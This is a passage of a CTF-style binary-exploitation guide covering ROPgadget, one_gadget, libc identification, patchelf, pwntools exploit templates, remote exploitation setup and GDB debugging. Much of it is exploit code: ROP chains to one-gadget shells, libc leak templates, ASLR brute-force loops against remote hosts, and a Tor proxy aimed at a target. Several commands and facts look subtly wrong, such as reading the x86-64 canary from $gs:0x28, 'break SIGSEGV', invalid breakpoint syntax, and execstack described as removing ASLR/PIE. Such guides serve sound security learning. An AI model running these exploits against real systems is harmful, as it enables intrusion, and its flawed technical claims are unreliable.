ROPgadget --binary ./binary | grep "pop rdi"
```

2. Verify in GDB:

```bash
gdb ./binary
(gdb) x/5i 0x401234
```

3. Build exploit with addresses:

```python
pop_rdi = 0x401234
mov_rax_rdi = 0x401235
syscall_gadget = 0x401236
```

**Optimizing gadget search**

Limit search scope for speed:

```bash
# Only search in main binary, not ASLR regions
ROPgadget --binary /path/to/binary --all

# Limit depth
ROPgadget --binary /path/to/binary --depth 2
```

---

## One_Gadget

One_gadget finds single ROP gadgets enabling shell spawning without full chain construction, dramatically simplifying exploitation when conditions are met.

**One_gadget installation**

```bash
gem install one_gadget
# or
sudo apt-get install one_gadget
```

**Basic usage**

Analyze libc for one-gadgets:

```bash
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

Output:

```
0x4f365 execve("/bin/sh", rsp+0x30, environ)
  constraints:
    rax == NULL

0x4f3d2 execve("/bin/sh", rsp+0x30, environ)
  constraints:
    [rsp+0x30] == NULL

0xe6c7e execve("/bin/sh", rsp+0x60, environ)
  constraints:
    [rsp+0x60] == NULL
```

**Understanding constraints**

Each gadget has conditions that must be satisfied:

```
rax == NULL         ; RAX register must be zero
rbx == NULL         ; RBX register must be zero
[rsp+0x30] == NULL  ; Memory at RSP+0x30 must be null
```

**Constraint satisfaction**

Before jumping to one-gadget, satisfy constraints:

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Gadget with constraint: rax == NULL
one_gadget_addr = libc_base + 0x4f365

# Build ROP to satisfy constraints
rop = ROP(binary)
rop.raw(xor_rax_gadget)  # RAX = 0
rop.raw(one_gadget_addr) # Call one-gadget

payload = b'A' * offset
payload += rop.chain()
```

**No-constraint gadgets**

Some gadgets require no constraints (rare):

```bash
one_gadget /libc.so.6 2>/dev/null | grep "constraints:"
# Look for entries with no constraints listed
```

**Finding libc version**

Identify libc used by system:

```bash
ldd /path/to/binary | grep libc
# Output: libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6

# Or check binary directly
file /lib/x86_64-linux-gnu/libc.so.6
```

**Libc database (online)**

When local libc unavailable:

1. Leak pointer from running binary
2. Check libc-database: https://libc.blukat.me/

Search by leaked address to identify libc version, then download.

**One_gadget in exploits**

Complete exploit using one-gadget:

```python
from pwn import *

# Setup
context.arch = 'amd64'
context.os = 'linux'
elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Leak libc base
p = process('./binary')
leaked = leak_via_format_string()
libc.address = leaked - 0x12345  # Adjust offset

# One-gadget with constraint satisfaction
rop = ROP(libc)
rop.raw(rop.find_gadget(['xor rax, rax', 'ret'])[0])  # Satisfy constraint
rop.raw(libc.address + 0x4f365)  # One-gadget address

# Build payload
offset = 40
payload = b'A' * offset
payload += rop.chain()

p.send(payload)
p.interactive()
```

**One_gadget limitations**

- **Constraint sensitivity:** Wrong registers crash exploit
- **Version-specific:** Different libc versions have different gadgets
- **Rare matches:** Most binaries don't have convenient one-gadgets
- **Complex constraints:** Some gadgets require specific memory states

**Constraint analysis**

Analyze which constraints easiest to satisfy:

```
rax == NULL         ; Easiest (xor rax, rax)
rbx == NULL         ; Easy (xor rbx, rbx)
[rsp+X] == NULL     ; Medium (requires memory setup)
r12 == NULL         ; Easy (xor r12, r12)
```

**Identifying glibc version online**

Build ID or version string:

```bash
readelf -p .comment /lib/x86_64-linux-gnu/libc.so.6
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GLIBC_" | tail -1
```

**Real-world one_gadget usage**

One-gadget particularly useful when:

- Complex ROP chains infeasible (few gadgets available)
- Binary heavily stripped (limited gadgets)
- Constraints easily satisfiable (often RAX=0 from prior operations)

**One_gadget integration with pwntools**

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Identify one-gadget programmatically
one_gadgets = [
    0x4f365,  # Known gadgets for this libc version
    0x4f3d2,
    0xe6c7e
]

for gadget_offset in one_gadgets:
    try:
        # Build exploit
        rop = ROP(libc)
        rop.raw(libc.symbols['__libc_start_main'] - 100)  # Dummy gadget
        rop.raw(libc.address + gadget_offset)
        
        # Test (would need actual exploitation here)
        print(f"Gadget 0x{gadget_offset:x} would be executed")
    except:
        print(f"Gadget 0x{gadget_offset:x} failed constraints")
```

**Advanced one_gadget techniques**

**Gadget chaining to satisfy constraints:**

```python
# Gadget requires rbx == NULL
rop = ROP(binary)
rop.raw(xor_rbx_gadget)     # rbx = 0
rop.raw(libc_base + one_gadget)
```

**Multiple one-gadgets:**

Some exploits try all available one-gadgets:

```python
one_gadgets = [0x4f365, 0x4f3d2, 0xe6c7e]

for gadget in one_gadgets:
    payload = build_payload_with_gadget(gadget)
    p = process('./binary')
    p.send(payload)
    try:
        p.recv(timeout=1)
        if shell_responsive():
            print(f"Success with gadget 0x{gadget:x}")
            break
    except:
        pass
```

---

**Related exploitation framework subtopics essential for comprehensive tooling mastery:** Custom Metasploit module development for bespoke vulnerabilities, pwntools template abstractions for rapid multi-target exploitation, and automated vulnerability scanning tool integration (Nessus, Shodan API) enabling targeted exploit generation for identified services.

---

## Libc Database Tools

### Overview

Libc database tools identify remote libc versions by leaking function addresses, enabling precise ROP gadget and offset calculations for remote exploitation.

### one_gadget

**Purpose**: Finds single-instruction shell spawning gadgets in libc

**Installation**:

```bash
gem install one_gadget
```

**Basic Usage**:

```bash
one_gadget /lib/x86_64-linux-gnu/libc.so.6
one_gadget libc.so.6 --level 1  # More thorough search
```

**CTF Application**:

```python
# After identifying libc version
# one_gadget output: 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints: [rsp+0x40] == NULL

from pwn import *
libc_base = leaked_address - libc.symbols['puts']
one_gadget_offset = 0x4f3d5
system_addr = libc_base + one_gadget_offset
# Overwrite return address with one_gadget
```

**Constraint Analysis**: one_gadget outputs constraints (register/memory requirements). Verify these are satisfied at hijack point.

### libc-database

**Installation**:

```bash
git clone https://github.com/niklasb/libc-database.git
cd libc-database
./get  # Downloads libc versions
```

**Finding Libc by Leaked Addresses**:

```bash
./find puts 7f1234567890
./find puts 7f1234567890 printf 7f1234568900  # Multiple leaks for precision
```

**Adding Custom Libc**:

```bash
./add /path/to/libc.so.6  # Adds to database
```

**Dumping Information**:

```bash
./dump libc6_2.27-3ubuntu1_amd64  # Shows symbols and offsets
```

### LibcSearcher (Python)

**Installation**:

```bash
git clone https://github.com/lieanu/LibcSearcher.git
cd LibcSearcher
python setup.py install
```

**Usage in Exploit**:

```python
from LibcSearcher import *

# After leaking puts address
puts_addr = u64(leak[:6].ljust(8, b'\x00'))
libc = LibcSearcher('puts', puts_addr)

libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
```

### pwntools libc Integration

**Online Database Query**:

```python
from pwn import *

# Query online database with leaked addresses
libc = ELF('./libc.so.6')  # Local libc
# OR
libc_obj = libcdb.search_by_build_id('buildid_here')
# OR
libc_obj = libcdb.search_by_symbol_offsets({'puts': 0x809c0, 'printf': 0x64e80})
```

**Automatic Offset Calculation**:

```python
libc = ELF('./libc.so.6')
libc.address = leaked_puts - libc.symbols['puts']  # Set base
system = libc.symbols['system']  # Auto-calculates
binsh = next(libc.search(b'/bin/sh'))  # Finds string
```

### blukat libc.rip

**Online Service**: https://libc.rip/ or https://libc.blukat.me/

**API Usage**:

```python
import requests

leaked = {'puts': 0x809c0, 'printf': 0x64e80}
r = requests.post('https://libc.rip/api/find', json={'symbols': leaked})
libc_ids = r.json()  # Returns matching libc identifiers

# Download specific libc
r = requests.get(f'https://libc.rip/api/libc/{libc_ids[0]}')
with open('libc.so.6', 'wb') as f:
    f.write(r.content)
```

**Manual Search**: Upload leaked addresses via web interface for interactive identification.

---

## Patchelf and Binary Patching

### Patchelf

**Installation**:

```bash
apt install patchelf
```

**Viewing Current Interpreter**:

```bash
patchelf --print-interpreter ./binary
patchelf --print-rpath ./binary
patchelf --print-needed ./binary  # Shows linked libraries
```

**Changing Interpreter**:

```bash
patchelf --set-interpreter /path/to/ld-linux.so.2 ./binary
patchelf --set-interpreter ./ld-2.27.so ./binary  # Local ld
```

**Setting RPATH (Library Search Path)**:

```bash
patchelf --set-rpath /path/to/libc/dir ./binary
patchelf --set-rpath '$ORIGIN' ./binary  # Current directory
patchelf --remove-rpath ./binary
```

**Replacing Needed Libraries**:

```bash
patchelf --replace-needed libc.so.6 ./custom_libc.so.6 ./binary
patchelf --add-needed libcustom.so ./binary
```

**CTF Use Case - Matching Remote Libc**:

```bash
# After identifying remote libc version
patchelf --set-interpreter ./ld-2.27.so ./challenge
patchelf --set-rpath '$ORIGIN' ./challenge
# Now challenge uses local ld-2.27.so and libc-2.27.so
```

### pwninit

**Installation**:

```bash
wget https://github.com/io12/pwninit/releases/latest/download/pwninit
chmod +x pwninit
```

**Automatic Patching**:

```bash
# Place challenge, libc.so.6, and ld-linux.so.2 in directory
pwninit
# Creates challenge_patched with correct interpreter/rpath
# Creates solve.py template
```

**Custom Options**:

```bash
pwninit --bin challenge --libc libc.so.6 --ld ld-2.27.so
pwninit --no-template  # Skip solve.py generation
```

### Binary Patching with Python (pwntools)

**Reading and Modifying Bytes**:

```python
from pwn import *

elf = ELF('./binary')
elf.write(elf.symbols['main'], asm('nop'))  # NOP out instruction
elf.save('./binary_patched')
```

**Patching Assembly**:

```python
context.arch = 'amd64'
elf = ELF('./binary')

# Replace function with shellcode
shellcode = asm(shellcraft.sh())
elf.write(elf.symbols['vuln'], shellcode)
elf.save('./patched')
```

**Patching GOT Entries**:

```python
elf = ELF('./binary')
elf.write(elf.got['exit'], p64(elf.symbols['main']))  # Redirect exit to main
elf.save('./patched')
```

### radare2 Binary Patching

**Interactive Patching**:

```bash
r2 -w ./binary  # Open in write mode
aaa  # Analyze
s main  # Seek to main
V  # Visual mode
# Press 'A' for assembly insert mode
# Press 'i' to insert bytes
wa nop  # Write assembly
q  # Quit and save
```

**Scripted Patching**:

```bash
r2 -w -c 'wa nop @ 0x401234' -qc 'exit' ./binary
```

### Hex Editor Patching

**xxd Method**:

```bash
xxd binary > binary.hex
# Edit hex values
xxd -r binary.hex > binary_patched
chmod +x binary_patched
```

**dd Precision Patching**:

```bash
# Replace 4 bytes at offset 0x1234 with "\x90\x90\x90\x90"
printf '\x90\x90\x90\x90' | dd of=binary bs=1 seek=$((0x1234)) count=4 conv=notrunc
```

### Common Patching Scenarios

**Bypassing Alarm/Time Checks**:

```python
# Patch alarm(30) call to alarm(3600)
elf = ELF('./binary')
alarm_call = elf.disasm(elf.symbols['main'], 100).find('alarm')  # [Inference]
# Manual: locate call, patch immediate value
```

**Removing ASLR/PIE**:

```bash
# [Unverified] - Effectiveness depends on linker and binary structure
execstack -c ./binary  # Clear executable stack flag
```

**Enabling Core Dumps**:

```bash
ulimit -c unlimited
echo 'core.%e.%p' > /proc/sys/kernel/core_pattern  # Requires root
```

---

## Exploit Template Generation

### pwntools Template Structure

**Basic Template**:

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
context.binary = elf = ELF('./binary')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote('host', port)
    elif args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
break *main+123
continue
'''.format(**locals())

# Exploit
io = start()

# [Your exploit logic here]

io.interactive()
```

**Advanced Configuration Options**:

```python
# Architecture-specific
context.arch = 'amd64'  # or 'i386', 'arm', 'mips'
context.os = 'linux'
context.bits = 64
context.endian = 'little'

# Timeout handling
context.timeout = 60

# Custom argv
def start(argv=[]):
    if args.REMOTE:
        return remote(args.HOST or 'challenge.ctf.com', int(args.PORT or 1337))
    # ...
```

### Automated Template Generators

**pwntools Template**:

```bash
pwn template ./binary > exploit.py
pwn template ./binary --host 127.0.0.1 --port 1337 > exploit.py
```

**pwninit Generated Template**:

```python
# Auto-generated by pwninit
#!/usr/bin/env python3
from pwn import *

exe = ELF("./binary_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        gdbscript = '''
        break *main
        continue
        '''
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = remote("addr", 1337)
    return r

# [Exploit here]
```

### Exploit Building Blocks

**Information Leak Template**:

```python
def leak(address):
    payload = flat(
        cyclic(offset),
        address,
        elf.symbols['puts'],
        elf.symbols['main']  # Return to main for second stage
    )
    io.sendline(payload)
    io.recvuntil(b'expected_output')
    leaked = u64(io.recv(6).ljust(8, b'\x00'))
    log.success(f'Leaked: {hex(leaked)}')
    return leaked
```

**ROP Chain Template**:

```python
rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = flat(
    cyclic(offset),
    rop.chain()
)
```

**Format String Template**:

```python
def write_primitive(address, value):
    # [Inference] - Assumes positional parameter known
    payload = fmtstr_payload(offset, {address: value})
    io.sendline(payload)
```

### Module Organization

**Multi-Stage Exploit Structure**:

```python
def stage1_leak():
    """Leak libc base address"""
    # Implementation
    return libc_base

def stage2_rop(libc_base):
    """Execute ROP chain with known libc"""
    # Implementation
    pass

def main():
    io = start()
    libc_base = stage1_leak()
    stage2_rop(libc_base)
    io.interactive()

if __name__ == '__main__':
    main()
```

---

## Remote Exploitation Setup

### pwntools Remote Connection

**Basic Remote Connection**:

```python
from pwn import *

io = remote('challenge.ctf.com', 1337)
io = remote('challenge.ctf.com', 1337, ssl=True)  # SSL/TLS
io = remote('challenge.ctf.com', 1337, typ='udp')  # UDP
```

**Connection with Timeout**:

```python
io = remote('challenge.ctf.com', 1337, timeout=30)
try:
    io.recvuntil(b'prompt', timeout=10)
except EOFError:
    log.error('Connection closed')
```

**Proxy Configuration**:

```python
context.proxy = (socks.SOCKS5, 'localhost', 9050)  # Tor
io = remote('target.onion', 1337)
```

### Local Testing Environment

**socat TCP Listener**:

```bash
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./binary
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"./binary",pty,stderr,setsid,sigint,sane
```

**xinetd Service**:

```bash
# /etc/xinetd.d/ctf_challenge
service ctf_challenge
{
    disable = no
    socket_type = stream
    protocol = tcp
    wait = no
    user = ctf
    bind = 0.0.0.0
    port = 1337
    server = /home/ctf/binary
    type = UNLISTED
    per_source = 5
    rlimit_cpu = 20
    rlimit_as = 1024M
}
```

**Docker Container**:

```dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y socat
COPY binary /home/ctf/
RUN chmod +x /home/ctf/binary
RUN useradd -m ctf
USER ctf
WORKDIR /home/ctf
CMD ["socat", "TCP-LISTEN:1337,reuseaddr,fork", "EXEC:./binary"]
```

```bash
docker build -t ctf_challenge .
docker run -d -p 1337:1337 ctf_challenge
```

### Exploit Reliability Techniques

**Retry Mechanism**:

```python
def exploit_with_retry(max_attempts=10):
    for attempt in range(max_attempts):
        try:
            io = remote('target', 1337)
            # Exploit logic
            io.interactive()
            return
        except Exception as e:
            log.warn(f'Attempt {attempt+1} failed: {e}')
            io.close()
    log.error('All attempts failed')
```

**ASLR Brute Force** [Inference - probabilistic, not guaranteed]:

```python
# 32-bit: 2^12 entropy (4096 attempts average)
# 64-bit: Not practical without info leak

while True:
    try:
        io = remote('target', 1337)
        # Exploit assuming base address
        io.recvuntil(b'shell>')
        log.success('Shell obtained!')
        break
    except:
        io.close()
```

**Heap Grooming for Reliability**:

```python
# Allocate predictable heap layout
for i in range(10):
    allocate(0x100)  # Fill tcache/fastbin
# Now exploitation more deterministic [Inference]
```

### Network Protocol Handling

**HTTP Wrapper**:

```python
import requests

session = requests.Session()
r = session.post('http://target/vuln', data={'input': payload})
```

**WebSocket Connection**:

```python
from websocket import create_connection

ws = create_connection('ws://target/socket')
ws.send(payload)
result = ws.recv()
```

### Debugging Remote Exploits

**Traffic Capture**:

```bash
tcpdump -i eth0 -w capture.pcap host target.com and port 1337
```

**pwntools Context Logging**:

```python
context.log_level = 'debug'  # Shows all send/recv
io = remote('target', 1337)
# Every io.send/recv logged with hex dump
```

**Custom Send/Recv Wrappers**:

```python
def send_payload(data):
    log.info(f'Sending: {len(data)} bytes')
    log.hexdump(data)
    io.send(data)

def recv_until(delim):
    data = io.recvuntil(delim, timeout=5)
    log.info(f'Received: {len(data)} bytes')
    return data
```

### Exploit Delivery Methods

**Base64 Encoded**:

```python
import base64
payload_b64 = base64.b64encode(payload)
io.sendline(payload_b64)
```

**Chunked Sending**:

```python
# Avoid input buffering issues
for i in range(0, len(payload), 100):
    io.send(payload[i:i+100])
    sleep(0.1)
```

**File Upload Exploit**:

```python
files = {'file': ('exploit.bin', payload, 'application/octet-stream')}
r = requests.post('http://target/upload', files=files)
```

---

## Related Topics

**Essential Prerequisite Knowledge**:

- ROP Chains & Gadget Chaining
- Heap Exploitation Techniques
- Format String Vulnerabilities
- Memory Leak Techniques

**Advanced Applications**:

- Kernel Exploitation Tooling
- Sandbox Escape Frameworks
- Multi-Architecture Exploitation
- Automated Vulnerability Discovery (AFL, LibFuzzer)

---

# Debugging Strategies

## Breakpoint Management

Breakpoints pause execution at specific locations, enabling inspection of program state. Effective breakpoint strategies accelerate vulnerability discovery and exploit verification.

**GDB breakpoint basics**

Set breakpoint at function:

```bash
gdb ./binary
(gdb) break main
(gdb) break vulnerable_function
(gdb) break 0x401234          ; Address
```

List breakpoints:

```bash
(gdb) info breakpoints
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x0000000000401234 in main at program.c:10
2       breakpoint     keep y   0x0000000000401567 in vulnerable at program.c:20
```

Delete breakpoints:

```bash
(gdb) delete 1                ; Delete by number
(gdb) delete                  ; Delete all
(gdb) clear main              ; Clear by function
```

**Conditional breakpoints**

Break only when condition true:

```bash
(gdb) break vulnerable if x > 100
(gdb) break *0x401234 if $rax == 0xdeadbeef
(gdb) break strcpy if strcmp($rdi, user_controlled) == 0
```

**Temporary breakpoints**

One-time breakpoint (deleted after hit):

```bash
(gdb) tbreak main              ; Temporary break at main
(gdb) tbreak *0x401234
```

**Hardware breakpoints**

Use CPU hardware (limited by CPU, typically 4):

```bash
(gdb) hbreak main              ; Hardware breakpoint
(gdb) hbreak *0x401234
```

Advantages:

- Watch code or data changes (hardware watchpoints)
- Faster execution
- Work across address space boundaries

Limitations:

- Limited count (usually 4)
- Architecture-specific

**Watchpoints (data breakpoints)**

Break when memory location changes:

```bash
(gdb) watch variable           ; Break on write
(gdb) watch buf                ; Break if buf changes
(gdb) watch *0x601234          ; Watch memory address
```

Read watchpoint (break on access):

```bash
(gdb) rwatch variable          ; Break on read
```

Access watchpoint (break on read or write):

```bash
(gdb) awatch variable          ; Break on any access
```

**Breakpoint commands**

Execute commands automatically at breakpoint:

```bash
(gdb) break vulnerable
(gdb) commands
> silent
> printf "RDI=%p, RSI=%p\n", $rdi, $rsi
> continue
> end
```

Useful for logging without interactive stepping.

**Breakpoint automation (scripts)**

Create breakpoint script:

```bash
cat > script.gdb << 'EOF'
break main
commands
silent
printf "Entered main\n"
continue
end

break vulnerable
commands
silent
printf "RSP=%p, RBP=%p\n", $rsp, $rbp
x/10x $rsp
continue
end

run
EOF

gdb -x script.gdb ./binary
```

**Dynamic breakpoint setting**

Set breakpoints conditionally during execution:

```bash
(gdb) break vulnerable
(gdb) run
(gdb) break *$rip+20           ; Set breakpoint relative to current RIP
(gdb) break *($rbp-0x20)       ; Breakpoint at buffer location
```

**Breakpoint disable/enable**

Temporarily disable without deleting:

```bash
(gdb) disable 1                ; Disable breakpoint 1
(gdb) enable 1                 ; Re-enable
(gdb) disable                  ; Disable all
```

**Hit count**

Break after N hits:

```bash
(gdb) break vulnerable ignore 5
; Ignores first 5 hits, breaks on 6th

(gdb) break vulnerable
(gdb) set ignore-count 10      ; Set ignore count
(gdb) info breakpoints         ; Shows ignore count
```

**Ignore count during debugging:**

```bash
(gdb) break loop_function
(gdb) run
; Hits 100 times in loop
(gdb) set ignore-count 99      ; Skip next 99 hits
(gdb) continue                 ; Continue, breaks after 99 more
```

**Breakpoint positions**

Break at specific line in source:

```bash
(gdb) break program.c:42
(gdb) break vulnerable.c:10
```

Break at offset in function:

```bash
(gdb) break main+10            ; 10 bytes after main
(gdb) break vulnerable+0x20    ; 0x20 bytes in
```

**Stepping with breakpoints**

Step over function call:

```bash
(gdb) step                     ; Step into function
(gdb) next                     ; Step over (skip function)
(gdb) nexti                    ; Next instruction
(gdb) stepi                    ; Step instruction
```

Continue to next breakpoint:

```bash
(gdb) continue                 ; Continue execution
(gdb) finish                   ; Run until return
```

**Radare2 breakpoints**

Similar breakpoint management in radare2:

```bash
r2 /path/to/binary
> db main                      ; Set breakpoint
> db list                      ; List breakpoints
> db- 0x401234                 ; Delete breakpoint
> dc                           ; Continue execution
```

**Breakpoint recovery after crash**

Breakpoints survive crashes, allowing debugging of signal handlers:

```bash
(gdb) break crash_handler
(gdb) run
; Program crashes, signal handler called
; Stops at breakpoint in handler
(gdb) bt                       ; Backtrace shows crash location
```

**Breakpoint in signal handler**

Debug signal handler execution:

```bash
(gdb) break SIGSEGV
(gdb) handle SIGSEGV stop      ; Stop on SIGSEGV
(gdb) run
; Segfault triggers handler
(gdb) bt                       ; Show stack with handler
```

**Practice: Finding buffer overflow**

```bash
gdb ./binary
(gdb) break main
(gdb) run
(gdb) break vulnerable         ; Set breakpoint at vulnerable function
(gdb) continue
(gdb) x/10x $rsp               ; Examine stack
(gdb) watch *0x601234          ; Watch GOT entry
(gdb) continue
; Watches trigger when overflow writes to GOT
```

---

## Memory Examination Commands

Inspecting memory reveals data layout, stack contents, heap state, and code structure critical for understanding program behavior and identifying vulnerabilities.

**Basic memory examination (x command)**

```bash
(gdb) x/10x $rsp               ; 10 hexadecimal words from RSP
(gdb) x/20x 0x601000           ; From specific address
(gdb) x/50x $rbp               ; Relative to base pointer
```

**Format specifiers**

```
x     : Hexadecimal
d     : Signed decimal
u     : Unsigned decimal
o     : Octal
t     : Binary
s     : String (null-terminated)
i     : Instruction (disassemble)
c     : Character
f     : Float
a     : Address
```

**Size specifiers**

```
b     : Byte (1 byte)
h     : Halfword (2 bytes)
w     : Word (4 bytes)
g     : Giant (8 bytes)
```

**Memory examination examples**

```bash
# Different formats
(gdb) x/10x $rsp               ; 10 hex values
(gdb) x/10d $rsp               ; 10 decimals
(gdb) x/10s 0x601000           ; 10 strings
(gdb) x/20i $rip               ; 20 instructions (disassembly)

# Different sizes
(gdb) x/10bx $rsp              ; 10 bytes in hex
(gdb) x/10hx $rsp              ; 10 halfwords
(gdb) x/10wx $rsp              ; 10 words
(gdb) x/10gx $rsp              ; 10 giant words (8-byte)

# Mixed
(gdb) x/20gx 0x7ffffffde000    ; 20 8-byte values
(gdb) x/100c 0x601000          ; 100 characters
(gdb) x/5i 0x401234            ; 5 instructions at address
```

**String examination**

```bash
(gdb) x/s 0x601000             ; Read string at address
(gdb) x/20s 0x601000           ; 20 strings (rarely useful)

# Alternative: print command
(gdb) print (char *)0x601000   ; Print as string
```

**Memory dump to file**

```bash
(gdb) dump memory /tmp/dump.bin 0x600000 0x602000
; Dump 0x2000 bytes starting at 0x600000
```

**Examine around pointer**

```bash
(gdb) x/10x 0x7ffffffde000
; Shows values at and after address

(gdb) x/10x 0x7ffffffde000-20
; Shows values before address
```

**Stack examination**

```bash
(gdb) info frame               ; Current frame info
(gdb) info locals              ; Local variables
(gdb) info args                ; Function arguments

(gdb) x/20gx $rsp              ; Raw stack view
```

**Heap examination**

```bash
# Using gdb-heap plugin (if installed)
(gdb) heap
(gdb) heap bins
(gdb) heap chunks
(gdb) heap inuse               ; Allocated chunks
```

Without plugin, manual examination:

```bash
(gdb) x/100x 0x602000          ; Examine heap region
(gdb) x/10gx 0x602000          ; 10 giant words
```

**Code examination**

```bash
(gdb) disassemble main         ; Disassemble function
(gdb) disassemble 0x401234     ; Disassemble at address
(gdb) x/10i $rip               ; 10 instructions from RIP

# Disassemble with Intel syntax
(gdb) set disassembly-flavor intel
(gdb) disassemble main
```

**Print command (alternative to x)**

```bash
(gdb) print buf                ; Print variable
(gdb) print *buf               ; Dereference
(gdb) print (int *)0x601234    ; Cast to int pointer
(gdb) print sizeof(buf)        ; Size of variable
```

**Pretty printing**

```bash
(gdb) print buf
$1 = {0x41, 0x42, 0x43, 0x44, ...}

# Pretty-print with formatting
(gdb) printf "%p\n", $rsp      ; Printf-style output
(gdb) printf "%x %x %x\n", $rdi, $rsi, $rdx
```

**Watch expression values**

```bash
(gdb) display $rsp             ; Auto-display RSP after each command
(gdb) display $rip
(gdb) display buf

(gdb) info display             ; List display expressions
(gdb) delete display 1         ; Stop displaying #1
```

**Hexdump equivalent in GDB**

```bash
(gdb) x/64bx 0x601000          ; 64 bytes in hex
# Output: xx xx xx xx xx xx xx xx ...

# More readable with formatting
(gdb) define hexdump
> set $bytes = $arg0
> printf "Address: %p\n", $arg1
> x/64bx $arg1
> end

(gdb) hexdump 100 0x601000
```

**Memory protection examination**

```bash
(gdb) info proc mappings       ; Show memory layout
# Output:
# Start Addr    End Addr      Size     Offset  Perms objfile
# 0x400000      0x401000      0x1000   0x0     r-xp  /path/to/binary
# 0x601000      0x602000      0x1000   0x0     rw-p  [heap]
```

**Finding readable/writable regions**

```bash
(gdb) info proc mappings
# Look for regions with rwx or rw- permissions
```

**Practice: Examine stack frame**

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run
(gdb) info frame
(gdb) x/10gx $rsp               ; Raw stack
(gdb) x/10gx $rbp-0x30          ; Stack around RBP
(gdb) x/s $rbp+0x8              ; Examine saved return address as string (weird but possible)
(gdb) disassemble [return_addr] ; Disassemble where we'll return
```

---

## Register Manipulation

Modifying register values during debugging enables testing different code paths, bypassing checks, and simulating specific program states.

**Examining registers**

```bash
(gdb) info registers           ; All registers
(gdb) info registers rax rdi   ; Specific registers
(gdb) print $rax               ; Print register value

(gdb) registers                ; Radare2 equivalent
```

**Register display**

```bash
(gdb) info registers
rax            0x1234567890abcdef 1311768467463127535
rbx            0x0                0
rcx            0x1                1
rdx            0x7ffff7dd9370     140737352273264
rsi            0x7ffffffde440     140737488346176
rdi            0x1                1
rbp            0x7ffffffde400     0x7ffffffde400
rsp            0x7ffffffde3f0     0x7ffffffde3f0
r8             0x7ffff7dd9370     140737352273264
r9             0x0                0
r10            0x0                0
r11            0x246              582
r12            0x401090           4198544
r13            0x7ffffffde500     140737488346368
r14            0x0                0
r15            0x0                0
rip            0x401234           0x401234
eflags         0x246              [ PF ZF IF ]
```

**Setting register values**

```bash
(gdb) set $rax = 0x1234
(gdb) set $rdi = 0x601000
(gdb) set $rsp = 0x7ffffffde000

# Set from expression
(gdb) set $rax = $rbx + 0x100
(gdb) set $rdi = (void *)0x601000

# Set from variable
(gdb) set $rax = sizeof(buf)
```

**Bypassing checks with register modification**

Bypass authentication:

```bash
(gdb) break authenticate
(gdb) run
(gdb) set $rax = 1             ; Set return value to success
(gdb) continue                 ; Skip actual authentication
```

Modify loop counter:

```bash
(gdb) break loop
(gdb) run
(gdb) set $rcx = 1             ; Set counter to 1
(gdb) continue                 ; Exits loop after 1 iteration
```

**Canary bypass testing**

```bash
(gdb) break vulnerable
(gdb) run payload
(gdb) print $rbp-0x8           ; Where canary stored
(gdb) set *(long *)($rbp-0x8) = 0x1234567890abcdef
; Now canary check uses different value
(gdb) continue
```

**Simulating function call**

```bash
(gdb) break main
(gdb) run
(gdb) set $rdi = 0x601000      ; Set 1st arg
(gdb) set $rsi = 0x1000         ; Set 2nd arg
(gdb) set $rip = 0x401234       ; Jump to function
(gdb) stepi                     ; Step into function
```

**ASLR bypassing via register**

```bash
(gdb) break vulnerable
(gdb) run
(gdb) info proc mappings       ; Find libc base
(gdb) set $libc_base = 0x7ffff7d00000  ; Set variable
(gdb) set $rax = $libc_base + 0x50000  ; Calculate function address
```

**Conditional register modification**

```bash
(gdb) break loop_test
(gdb) commands
> if $rcx > 100
>   set $rcx = 100
> end
> continue
> end
```

**Flag register modification**

Modify condition flags:

```bash
(gdb) set $eflags = 0x246      ; Set flags directly

# Specific flags
(gdb) set $eflags |= 0x1       ; Set carry flag
(gdb) set $eflags &= ~0x40     ; Clear zero flag
```

Flag meanings:

- 0x1 (CF): Carry
- 0x4 (PF): Parity
- 0x40 (ZF): Zero
- 0x80 (SF): Sign
- 0x800 (OF): Overflow

**Segment register modification**

```bash
(gdb) set $fs = 0x63
(gdb) set $gs = 0x62

# Read TLS canary
(gdb) x/gx $gs:0x28
```

**Vector register (SSE/AVX)**

```bash
(gdb) info registers xmm0
(gdb) set $xmm0.v16_int8 = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}

# AVX (256-bit)
(gdb) info registers ymm0
```

**Calling functions from GDB**

Execute function with modified registers:

```bash
(gdb) break main
(gdb) run
(gdb) call vulnerable()        ; Call vulnerable function
(gdb) print $rax               ; Check return value

# Call with arguments
(gdb) call system("/bin/sh")   ; Execute shell command
```

**Radare2 register manipulation**

```bash
r2 /path/to/binary
> aer                          ; Show registers
> aer rax = 0x1234             ; Set RAX
> dr                           ; Dump registers

# In debug mode
> db main                      ; Set breakpoint
> dc                           ; Continue
> dr rax = 0x1234              ; Modify during execution
```

**Practice: Bypass canary**

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run
(gdb) x/gx $gs:0x28            ; Read actual canary
0x7ffff7e20cc0: 0x1234567890abcdef

(gdb) set $canary = 0x1234567890abcdef
(gdb) x/10gx $rbp-0x20          ; Examine stack

; Simulate overflow
(gdb) set *(long *)($rbp-0x8) = $canary  ; Place correct canary
